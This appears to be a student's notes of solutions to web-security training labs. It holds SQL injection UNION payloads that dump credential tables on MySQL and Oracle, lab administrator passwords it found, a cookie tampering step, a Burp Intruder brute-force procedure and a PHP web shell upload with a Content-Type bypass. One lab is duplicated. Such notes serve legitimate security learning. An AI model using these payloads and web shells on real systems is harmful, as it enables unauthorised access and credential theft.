## Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft
1. Use Burp Suite to intercept and modify the request that sets the product category filter.
2. Determine the number of columns that are being returned by the query and which columns contain text data. Verify that the query is returning two columns, both of which contain text, using a payload like the following in the category parameter:

	'+UNION+SELECT+'abc','def'#
3. Use the following payload to display the database version:

	'+UNION+SELECT+@@version,+NULL#

## Lab: SQL injection attack, listing the database contents on non-Oracle databases

1. Use Burp Suite to intercept and modify the request that sets the product category filter.
2. Determine the number of columns that are being returned by the query and which columns contain text data. Verify that the query is returning two columns, both of which contain text, using a payload like the following in the category parameter:

	'+UNION+SELECT+'abc','def'--
3. Use the following payload to retrieve the list of tables in the database:

	'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
4. Find the name of the table containing user credentials.
5. Use the following payload (replacing the table name) to retrieve the details of the columns in the table:

	'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--
6. Find the names of the columns containing usernames and passwords.
7. Use the following payload (replacing the table and column names) to retrieve the usernames and passwords for all users:

	'+UNION+SELECT+username_abcdef,+password_abcdef+FROM+users_abcdef--
Find the password for the administrator user, and use it to log in.

Found Following:

	administrator
	bpczg2saykfcbedstoff

## Lab: SQL injection attack, listing the database contents on Oracle

1. Use Burp Suite to intercept and modify the request that sets the product category filter.
2. Determine the number of columns that are being returned by the query and which columns contain text data. Verify that the query is returning two columns, both of which contain text, using a payload like the following in the category parameter:

	'+UNION+SELECT+'abc','def'+FROM+dual--
3. Use the following payload to retrieve the list of tables in the database:

	'+UNION+SELECT+table_name,NULL+FROM+all_tables--
4. Find the name of the table containing user credentials.
5. Use the following payload (replacing the table name) to retrieve the details of the columns in the table:

	'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_ABCDEF'--
6. Find the names of the columns containing usernames and passwords.
7. Use the following payload (replacing the table and column names) to retrieve the usernames and passwords for all users:

	'+UNION+SELECT+USERNAME_ABCDEF,+PASSWORD_ABCDEF+FROM+USERS_ABCDEF--
8. Find the password for the administrator user, and use it to log in.
Found Following in oracle

	kcn6kb2819sbn1b3fc87
	administrator

## Lab: SQL injection UNION attack, determining the number of columns returned by the query
1. Use Burp Suite to intercept and modify the request that sets the product category filter.
2. Modify the category parameter, giving it the value '+UNION+SELECT+NULL--. Observe that an error occurs.
3. Modify the category parameter to add an additional column containing a null value:

	'+UNION+SELECT+NULL,NULL--
4. Continue adding null values until the error disappears and the response includes additional content containing the null values.

## Lab: User role controlled by request parameter

	Browse to /admin and observe that you can't access the admin panel.
	Browse to the login page.
	In Burp Proxy, turn interception on and enable response interception.
	Complete and submit the login page, and forward the resulting request in Burp.
	Observe that the response sets the cookie Admin=false. Change it to Admin=true.
	Load the admin panel and delete carlos.

Logged in, tried to load admin page(/admin), changed cookie from Admin=false to Admin=true, reloaded (/admin) page, deleted the user needed.

## Lab: Username enumeration via different responses

	With Burp running, investigate the login page and submit an invalid username and password.
	In Burp, go to Proxy > HTTP history and find the POST /login request. Highlight the value of the username parameter in the request and send it to Burp Intruder.
	In Burp Intruder, go to the Positions tab. Notice that the username parameter is automatically set as a payload position. This position is indicated by two § symbols, for example: username=§invalid-username§. Leave the password as any static value for now.
	Make sure that the Sniper attack type is selected.
	On the Payloads tab, make sure that the Simple list payload type is selected.
	Under Payload settings, paste the list of candidate usernames. Finally, click Start attack. The attack will start in a new window.
	When the attack is finished, on the Results tab, examine the Length column. You can click on the column header to sort the results. Notice that one of the entries is longer than the others. Compare the response to this payload with the other responses. Notice that other responses contain the message Invalid username, but this response says Incorrect password. Make a note of the username in the Payload column.
	Close the attack and go back to the Positions tab. Click Clear, then change the username parameter to the username you just identified. Add a payload position to the password parameter. The result should look something like this:

	username=identified-user&password=§invalid-password§
	On the Payloads tab, clear the list of usernames and replace it with the list of candidate passwords. Click Start attack.
	When the attack is finished, look at the Status column. Notice that each request received a response with a 200 status code except for one, which got a 302 response. This suggests that the login attempt was successful - make a note of the password in the Payload column.
	Log in using the username and password that you identified and access the user account page to solve the lab.

## Lab: Username enumeration via different responses

	With Burp running, investigate the login page and submit an invalid username and password.
	In Burp, go to Proxy > HTTP history and find the POST /login request. Highlight the value of the username parameter in the request and send it to Burp Intruder.
	In Burp Intruder, go to the Positions tab. Notice that the username parameter is automatically set as a payload position. This position is indicated by two § symbols, for example: username=§invalid-username§. Leave the password as any static value for now.
	Make sure that the Sniper attack type is selected.
	On the Payloads tab, make sure that the Simple list payload type is selected.
	Under Payload settings, paste the list of candidate usernames. Finally, click Start attack. The attack will start in a new window.
	When the attack is finished, on the Results tab, examine the Length column. You can click on the column header to sort the results. Notice that one of the entries is longer than the others. Compare the response to this payload with the other responses. Notice that other responses contain the message Invalid username, but this response says Incorrect password. Make a note of the username in the Payload column.
	Close the attack and go back to the Positions tab. Click Clear, then change the username parameter to the username you just identified. Add a payload position to the password parameter. The result should look something like this:

	username=identified-user&password=§invalid-password§
	On the Payloads tab, clear the list of usernames and replace it with the list of candidate passwords. Click Start attack.
	When the attack is finished, look at the Status column. Notice that each request received a response with a 200 status code except for one, which got a 302 response. This suggests that the login attempt was successful - make a note of the password in the Payload column.
	Log in using the username and password that you identified and access the user account page to solve the lab.

	Note
	It's also possible to brute-force the login using a single cluster bomb attack. However, it's generally much more efficient to enumerate a valid username first if possible.

## Lab: Remote code execution via web shell upload

	APPRENTICE

	LAB
	Solved
	This lab contains a vulnerable image upload function. It doesn't perform any validation on the files users upload before storing them on the server's filesystem.

	To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file /home/carlos/secret. Submit this secret using the button provided in the lab banner.

	You can log in to your own account using the following credentials: wiener:peter

	ACCESS THE LAB
	Solution
	While proxying traffic through Burp, log in to your account and notice the option for uploading an avatar image.
	Upload an arbitrary image, then return to your account page. Notice that a preview of your avatar is now displayed on the page.
	In Burp, go to Proxy > HTTP history. Click the filter bar to open the Filter settings dialog. Under Filter by MIME type, enable the Images checkbox, then apply your changes.
	In the proxy history, notice that your image was fetched using a GET request to /files/avatars/<YOUR-IMAGE>. Send this request to Burp Repeater.
	On your system, create a file called exploit.php, containing a script for fetching the contents of Carlos's secret file. For example:

	<?php echo file_get_contents('/home/carlos/secret'); ?>
	Use the avatar upload function to upload your malicious PHP file. The message in the response confirms that this was uploaded successfully.
	In Burp Repeater, change the path of the request to point to your PHP file:

	GET /files/avatars/exploit.php HTTP/1.1
	Send the request. Notice that the server has executed your script and returned its output (Carlos's secret) in the response.
	Submit the secret to solve the lab.

## Lab: Web shell upload via Content-Type restriction bypass

	APPRENTICE

	LAB
	Not solved
	This lab contains a vulnerable image upload function. It attempts to prevent users from uploading unexpected file types, but relies on checking user-controllable input to verify this.

	To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file /home/carlos/secret. Submit this secret using the button provided in the lab banner.

	You can log in to your own account using the following credentials: wiener:peter

	ACCESS THE LAB
	Solution
	Log in and upload an image as your avatar, then go back to your account page.
	In Burp, go to Proxy > HTTP history and notice that your image was fetched using a GET request to /files/avatars/<YOUR-IMAGE>. Send this request to Burp Repeater.
	On your system, create a file called exploit.php, containing a script for fetching the contents of Carlos's secret. For example:

	<?php echo file_get_contents('/home/carlos/secret'); ?>
	Attempt to upload this script as your avatar. The response indicates that you are only allowed to upload files with the MIME type image/jpeg or image/png.
	In Burp, go back to the proxy history and find the POST /my-account/avatar request that was used to submit the file upload. Send this to Burp Repeater.
	In Burp Repeater, go to the tab containing the POST /my-account/avatar request. In the part of the message body related to your file, change the specified Content-Type to image/jpeg.
	Send the request. Observe that the response indicates that your file was successfully uploaded.
	Switch to the other Repeater tab containing the GET /files/avatars/<YOUR-IMAGE> request. In the path, replace the name of your image file with exploit.php and send the request. Observe that Carlos's secret was returned in the response.
	Submit the secret to solve the lab.

